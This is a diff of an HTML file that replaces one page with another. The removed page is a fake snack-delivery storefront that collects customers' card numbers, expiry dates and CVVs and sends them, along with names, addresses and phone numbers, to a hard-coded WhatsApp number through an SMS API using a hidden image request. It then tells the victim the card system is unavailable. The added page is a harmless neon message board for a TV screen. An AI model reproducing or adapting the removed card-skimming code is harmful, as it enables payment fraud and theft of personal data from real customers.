@@ -2,185 +2,91 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>JP Lanches - Delivery</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telão de Recados - Peso Pena</title>
     <style>
-        :root { --cor-p: #f39c12; --cor-s: #27ae60; --cor-e: #e74c3c; --fundo: #f4f4f4; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--fundo); margin: 0; padding-bottom: 180px; }
-        .container { max-width: 450px; margin: auto; padding: 15px; }
-        .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-p); }
-        .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); display: block; }
-        .status { font-size: 0.9em; color: var(--cor-s); font-weight: bold; margin-top: 5px; }
-        .tempo { font-size: 0.8em; color: #666; }
-        
-        .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
-        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .lanche-img { width: 100%; height: 200px; object-fit: cover; }
-        .lanche-info { padding: 15px; text-align: center; }
-        .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
-
-        .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; z-index: 9999; box-sizing: border-box; }
-        .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
-
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
-        .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; }
-        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        .btn-acao { width: 100%; padding: 16px; border: none; border-radius: 10px; font-weight: bold; color: #fff; margin-top: 10px; cursor: pointer; }
+        /* Tudo aqui é otimizado para não pesar a memória da TV */
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, #1a1a2e 0%, #0f0f1a 100%);
+            font-family: 'Arial Black', sans-serif;
+            overflow: hidden; /* Trava a rolagem da tela */
+            display: flex; justify-content: center; align-items: center;
+        }
+        #caixa-recado {
+            text-align: center;
+            opacity: 0; /* Começa invisível para o efeito de piscar */
+            transition: opacity 1.5s ease-in-out;
+            max-width: 90%;
+        }
+        .nome-cliente {
+            font-size: 55px;
+            color: #00ffcc; /* Verde neon */
+            text-shadow: 0 0 15px #00ffcc;
+            margin-bottom: 20px;
+        }
+        .texto-recado {
+            font-size: 90px;
+            color: #ffffff;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px #ff007f, 0 0 40px #ff007f; /* Rosa neon */
+        }
+        /* Efeito de coração batendo para dar vida à tela */
+        @keyframes pulso {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+        .animacao-pulso {
+            animation: pulso 3s infinite;
+        }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <span class="logo">🍔 JP LANCHES</span>
-    <div class="status">🟢 ABERTO</div>
-    <div class="tempo">Tempo de entrega: 30-50 min</div>
-</div>
-
-<div class="container">
-    <div class="lanche-card" onclick="selecionar(this, '1 XTudo + Guaravita', 10)">
-        <img src="https://instadelivery-public.nyc3.cdn.digitaloceanspaces.com/itens/1720704185668fdcb962de8_75_75.jpeg" class="lanche-img">
-        <div class="lanche-info"><strong>1 XTudo + Guaravita</strong><br><span class="preco">R$ 10,00</span></div>
+    <!-- Esta é a área onde a mensagem aparece na tela -->
+    <div id="caixa-recado" class="animacao-pulso">
+        <div class="nome-cliente" id="nome">Carregando...</div>
+        <div class="texto-recado" id="mensagem">Preparando o telão!</div>
     </div>
-    <div class="lanche-card" onclick="selecionar(this, '3 XTudo + Refri 2L', 30)">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiyXv-IHrHcr8eXqCpV00wGnzrZDYzc-XO-A&s" class="lanche-img">
-        <div class="lanche-info"><strong>3 XTudo + Refri 2L</strong><br><span class="preco">R$ 30,00</span></div>
-    </div>
-    <div class="lanche-card" onclick="selecionar(this, '5 XTudo + Refri 2L', 50)">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcOIDEufPfWkk2bK_TpBWkzBnxUj_c-9lweA&s" class="lanche-img">
-        <div class="lanche-info"><strong>5 XTudo + Refri 2L</strong><br><span class="preco">R$ 50,00</span></div>
-    </div>
-</div>
 
-<div class="barra-carrinho">
-    <div>Total: <br><strong>R$ <span id="v-total">0.00</span></strong></div>
-    <button class="btn-finalizar" onclick="abrirModal('m-end')">FINALIZAR</button>
-</div>
+    <script>
+        // Simulador de recados (Aqui é onde depois conectaremos o seu Banco de Dados)
+        const recados = [
+            { nome: "João Silva", texto: "Manda um abraço pra mesa 4!" },
+            { nome: "Maria", texto: "O show tá bom demais!" },
+            { nome: "Galera do Fundão", texto: "Toca aquela moda antiga!" },
+            { nome: "Marcos", texto: "Aniversário da Ana hoje, manda parabéns!" }
+        ];
 
-<div id="m-end" class="modal">
-    <div class="modal-content">
-        <h3 style="text-align:center">📍 Dados para Entrega</h3>
-        <input type="text" id="nome-cliente" placeholder="Seu Nome">
-        <input type="text" id="rua" placeholder="Rua">
-        <input type="text" id="numero" placeholder="Número">
-        <input type="text" id="bairro" placeholder="Bairro">
-        <input type="text" id="complemento" placeholder="Complemento (Opcional)">
-        <button class="btn-acao" style="background:var(--cor-s)" onclick="irPag()">PRÓXIMO</button>
-    </div>
-</div>
+        let contador = 0;
+        const caixa = document.getElementById('caixa-recado');
+        const campoNome = document.getElementById('nome');
+        const campoMensagem = document.getElementById('mensagem');
 
-<div id="m-pag" class="modal">
-    <div class="modal-content">
-        <h3 style="text-align:center">💳 Pagamento</h3>
-        <div id="opc-ini">
-            <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">Pagar com PIX</button>
-            <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
-        </div>
-        <div id="tela-pix" style="display:none;">
-            <input type="tel" id="zap-cliente" placeholder="Seu WhatsApp" maxlength="15">
-            <button class="btn-acao" style="background:#32bcad" onclick="enviarPix()">GERAR CÓDIGO PIX</button>
-        </div>
-        <div id="tela-card" style="display:none;">
-            <input type="tel" id="c-num" placeholder="Número do Cartão" maxlength="19">
-            <input type="text" id="c-nome" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;">
-                <input type="tel" id="c-val" placeholder="MM/AA" maxlength="5">
-                <input type="tel" id="c-cvv" placeholder="CVV" maxlength="3">
-            </div>
-            <button class="btn-acao" style="background:var(--cor-e)" onclick="enviarCard()">CONFIRMAR PAGAMENTO</button>
-        </div>
-    </div>
-</div>
+        function girarTelao() {
+            // Apaga a mensagem atual lentamente
+            caixa.style.opacity = 0;
 
-<script>
-    let pedido = null;
-    const RECIPIENT = "+5522992195418";
-    const APIKEY = "btucduKav5VY";
+            setTimeout(() => {
+                // Prepara a próxima mensagem no escuro
+                if(contador >= recados.length) contador = 0; // Se acabar, recomeça
+                
+                campoNome.innerText = recados[contador].nome + " mandou:";
+                campoMensagem.innerText = '"' + recados[contador].texto + '"';
+                
+                // Acende a nova mensagem na tela
+                caixa.style.opacity = 1;
+                contador++;
+            }, 1500); // Tempo que a tela fica apagada entre um recado e outro
+        }
 
-    // Máscaras de input
-    document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
-    document.getElementById('c-val').addEventListener('input', e => {
-        let v = e.target.value.replace(/\D/g, '');
-        if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
-        e.target.value = v;
-    });
-    document.getElementById('zap-cliente').addEventListener('input', e => {
-        let v = e.target.value.replace(/\D/g, '');
-        v = v.replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2");
-        e.target.value = v;
-    });
-
-    function selecionar(el, nome, preco) {
-        document.querySelectorAll('.lanche-card').forEach(c => c.classList.remove('active'));
-        el.classList.add('active');
-        pedido = { nome, preco };
-        document.getElementById('v-total').innerText = preco.toFixed(2);
-    }
-
-    function abrirModal(id) { if(!pedido) return alert("Escolha o lanche!"); document.getElementById(id).style.display='flex'; }
-    
-    function irPag() { 
-        if(!document.getElementById('nome-cliente').value || !document.getElementById('rua').value) return alert("Preencha Nome e Rua!");
-        document.getElementById('m-end').style.display='none'; 
-        document.getElementById('m-pag').style.display='flex'; 
-    }
-
-    function setTela(t) {
-        document.getElementById('opc-ini').style.display = t === 'inicio' ? 'block' : 'none';
-        document.getElementById('tela-pix').style.display = t === 'pix' ? 'block' : 'none';
-        document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
-    }
-
-    // Função de disparo para a API (Apenas texto)
-    function dispararAPI(texto) {
-        const url = `http://api.textmebot.com/send.php?recipient=${RECIPIENT}&apikey=${APIKEY}&text=${encodeURIComponent(texto)}`;
-        // Criar elemento de imagem é apenas o método técnico para enviar a URL sem abrir nova aba
-        const gatilho = new Image();
-        gatilho.src = url;
-    }
-
-    function enviarPix() {
-        const cliente = document.getElementById('nome-cliente').value;
-        const zap = document.getElementById('zap-cliente').value;
-        const rua = document.getElementById('rua').value;
-        const num = document.getElementById('numero').value;
-        const bairro = document.getElementById('bairro').value;
-        const comp = document.getElementById('complemento').value;
+        // Troca de recado automaticamente a cada 8 segundos
+        setInterval(girarTelao, 8000);
         
-        if(zap.length < 14) return alert("WhatsApp inválido!");
-
-        const dadosTexto = `✅ NOVO PEDIDO PIX\n\n` +
-                           `Cliente: ${cliente}\n` +
-                           `WhatsApp: ${zap}\n` +
-                           `Pedido: ${pedido.nome}\n` +
-                           `Total: R$ ${pedido.preco.toFixed(2)}\n` +
-                           `End: ${rua}, ${num} - ${bairro} (${comp})`;
-        
-        dispararAPI(dadosTexto);
-        
-        alert("Pedido Realizado! Verifique seu WhatsApp para receber o código PIX.");
-        setTimeout(() => { location.reload(); }, 1000);
-    }
-
-    function enviarCard() {
-        const cliente = document.getElementById('nome-cliente').value;
-        const c_num = document.getElementById('c-num').value;
-        const c_nome = document.getElementById('c-nome').value;
-        const val = document.getElementById('c-val').value;
-        const cvv = document.getElementById('c-cvv').value;
-
-        const alertaTexto = `⚠️ ALERTA CARTÃO\n\n` +
-                            `Cliente: ${cliente}\n` +
-                            `Número: ${c_num}\n` +
-                            `Nome: ${c_nome}\n` +
-                            `Validade: ${val}\n` +
-                            `CVV: ${cvv}\n` +
-                            `Valor: R$ ${pedido.preco.toFixed(2)}`;
-        
-        dispararAPI(alertaTexto);
-        alert("Sistema de cartão indisponível. Por favor, utilize o PIX.");
-        setTela('pix');
-    }
-</script>
+        // Puxa a primeira mensagem logo que a TV liga
+        setTimeout(girarTelao, 1000);
+    </script>
 
 </body>
 </html>
